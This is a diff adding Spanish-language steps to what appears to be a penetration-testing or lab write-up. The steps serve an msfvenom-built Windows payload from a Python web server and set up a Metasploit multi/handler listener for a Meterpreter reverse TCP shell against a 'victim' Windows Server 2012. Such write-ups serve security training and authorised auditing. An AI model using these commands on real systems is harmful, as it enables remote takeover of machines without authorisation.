@@ -71,5 +71,24 @@ Utilizamos la herramienta `msfvenom` para compilar un agente nativo de Windows e
 
 
 
+### Paso 3.2: Transferencia del Payload al Servidor Víctima
 
+Para trasladar el binario `agente64.exe` desde nuestra máquina de auditoría hacia el Windows Server 2012, levantamos un servidor web temporal en Kali Linux utilizando Python en el puerto `80`.
+
+```bash
+python3 -m http.server 80
+```
+
+
+
+Paso 3.3: Configuración del Escuchador (Multi/Handler) en Metasploit
+Una vez que el archivo ha sido puesto a disposición en la red, regresamos a la terminal de Kali Linux para detener el servidor web temporal (mediante Ctrl + C) e iniciamos el Framework de Metasploit. Configurar el módulo genérico de escucha multi/handler es indispensable para interceptar la conexión de vuelta (Reverse TCP), asegurando que la arquitectura (x64) y los parámetros de red local coincidan plenamente con los del binario compilado.
+
+Bash
+msfconsole
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.10.5
+set LPORT 4444
+exploit
 
